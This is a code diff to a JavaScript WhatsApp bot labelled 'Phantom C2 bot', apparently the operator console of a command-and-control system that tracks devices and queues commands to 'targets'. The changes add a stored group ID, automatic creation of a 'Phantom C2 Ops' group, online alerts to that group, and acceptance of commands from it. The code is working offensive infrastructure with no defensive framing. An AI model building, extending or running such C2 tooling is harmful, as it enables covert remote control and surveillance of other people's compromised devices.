@@ -23,6 +23,14 @@ const GROUP_MODE = process.env.GROUP_MODE === 'true';
 const AUTH_DIR = process.env.AUTH_DIR || './auth_info';
 const DB_PATH = process.env.DB_PATH || './data.db';
 const TARGET_DB_PATH = process.env.TARGET_DB_PATH || './targets.json';
+const GROUP_JID_PATH = './group_jid.txt';
+
+function getStoredGroupJid() {
+  try { return fs.readFileSync(GROUP_JID_PATH, 'utf8').trim() || null; } catch { return null; }
+}
+function storeGroupJid(jid) {
+  fs.writeFileSync(GROUP_JID_PATH, jid);
+}
 
 fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
 fs.mkdirSync(AUTH_DIR, { recursive: true });
@@ -176,6 +184,7 @@ await loadPlugins();
 function createCtx(sock, jid, cmd, args, text) {
   return {
     sock, jid, cmd, args, text,
+    groupJid: (GROUP_MODE && alertJid && alertJid.endsWith('@g.us')) ? alertJid : null,
     getDevices,
     queueCommand,
     getTarget: (jid) => targetMap[jid],
@@ -298,9 +307,36 @@ async function startBot() {
     if (connection === 'open') {
       console.log(`[+] Connected as ${sock.user?.id}`);
       everRegistered = true;
-      const targetJid = alertJid || (process.env.PHONE_NUMBER ? `${process.env.PHONE_NUMBER.replace(/\D/g, '')}@s.whatsapp.net` : null);
-      if (targetJid) {
-        try { await sock.sendMessage(targetJid, { text: '✅ *Phantom C2 bot online*\nSend `!menu` to start.' }); } catch (e) { console.error('[!] online alert failed:', e.message); }
+
+      let operatorJid = null;
+      if (OWNER_JID) {
+        operatorJid = OWNER_JID.includes('@') ? OWNER_JID : `${OWNER_JID}@s.whatsapp.net`;
+      } else if (process.env.PHONE_NUMBER) {
+        operatorJid = `${process.env.PHONE_NUMBER.replace(/\D/g, '')}@s.whatsapp.net`;
+      }
+
+      if (GROUP_MODE && operatorJid) {
+        const storedGroup = getStoredGroupJid();
+        if (storedGroup) {
+          alertJid = storedGroup;
+          console.log(`[+] Using stored group: ${alertJid}`);
+        } else {
+          try {
+            const group = await sock.groupCreate('Phantom C2 Ops', [operatorJid]);
+            alertJid = group.id;
+            storeGroupJid(group.id);
+            console.log(`[+] Created group ${group.id}`);
+          } catch (e) {
+            console.error('[!] Group creation failed:', e.message);
+            alertJid = operatorJid;
+          }
+        }
+      } else if (operatorJid) {
+        alertJid = operatorJid;
+      }
+
+      if (alertJid) {
+        try { await sock.sendMessage(alertJid, { text: '✅ *Phantom C2 bot online*\nSend `!menu` in this group to start.' }); } catch (e) { console.error('[!] online alert failed:', e.message); }
       }
     }
     if (connection === 'close') {
@@ -325,7 +361,8 @@ async function startBot() {
       else if (msg.message?.listResponseMessage) console.log(`[debug] list response fromMe=${fromMe} jid=${jid} rowId=${msg.message?.listResponseMessage?.singleSelectReply?.selectedRowId}`);
       const isGroup = jid.endsWith('@g.us');
 
-      if (OWNER_JID && jid !== OWNER_JID && !(GROUP_MODE && isGroup)) continue;
+      const ownerJidNormalized = OWNER_JID?.includes('@') ? OWNER_JID : (OWNER_JID ? `${OWNER_JID}@s.whatsapp.net` : null);
+      if (ownerJidNormalized && jid !== ownerJidNormalized && jid !== alertJid && !(GROUP_MODE && isGroup)) continue;
 
       if (!alertJid) {
         alertJid = jid;
